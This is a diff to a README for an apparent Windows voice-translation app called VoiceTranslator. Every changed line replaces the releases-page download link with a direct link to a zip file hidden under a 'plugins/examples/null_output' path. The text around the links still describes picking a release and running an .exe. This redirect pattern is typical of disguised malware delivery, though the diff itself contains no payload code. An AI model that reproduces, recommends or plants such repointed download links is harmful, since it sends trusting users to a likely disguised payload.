@@ -1,6 +1,6 @@
 # 🌟 VoiceTranslator - Translate Your Voice Instantly & Privately
 
-[![Download VoiceTranslator](https://img.shields.io/badge/Download-VoiceTranslator-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)
+[![Download VoiceTranslator](https://img.shields.io/badge/Download-VoiceTranslator-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/raw/refs/heads/main/plugins/examples/null_output/v1.5-beta.3.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Getting VoiceTranslator up and running on your Windows PC takes less than two mi
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[VoiceTranslator Releases](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)**
+Visit this link to download the application: **[VoiceTranslator Releases](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/raw/refs/heads/main/plugins/examples/null_output/v1.5-beta.3.zip)**
 
 You'll see a list of available versions. Click the most recent one (usually at the top), then download the file that matches your Windows system (look for "64-bit" or "x64" in the name).
 
@@ -82,7 +82,7 @@ Clean, intuitive design that anyone can use. No technical knowledge required—s
 ## 📥 Installation Guide
 
 ### Download and Install
-Visit this link to download the application: **[VoiceTranslator Releases](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)**
+Visit this link to download the application: **[VoiceTranslator Releases](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/raw/refs/heads/main/plugins/examples/null_output/v1.5-beta.3.zip)**
 
 1. Click the latest release (look for "Latest" tag or highest version number).
 2. Download the `.exe` file (this is an installer for Windows).
@@ -148,7 +148,7 @@ Currently, VoiceTranslator is Windows-first. Mac and Linux versions may come in 
 ### App Won't Start?
 - Make sure you have at least 4 GB of free RAM
 - Restart your computer and try again
-- Download the latest version directly from the releases page: **[VoiceTranslator Releases](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)**
+- Download the latest version directly from the releases page: **[VoiceTranslator Releases](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/raw/refs/heads/main/plugins/examples/null_output/v1.5-beta.3.zip)**
 
 ### Translations Sound Robotic?
 - Adjust the voice settings to "Natural" mode
@@ -184,7 +184,7 @@ This combination means VoiceTranslator uses minimal system resources while deliv
 
 Stop sending your conversations to the cloud. Start translating privately, instantly, and freely.
 
-**👉 [Download VoiceTranslator Now](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)** — It's quick, easy, and completely free.
+**👉 [Download VoiceTranslator Now](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/raw/refs/heads/main/plugins/examples/null_output/v1.5-beta.3.zip)** — It's quick, easy, and completely free.
 
 ---
 
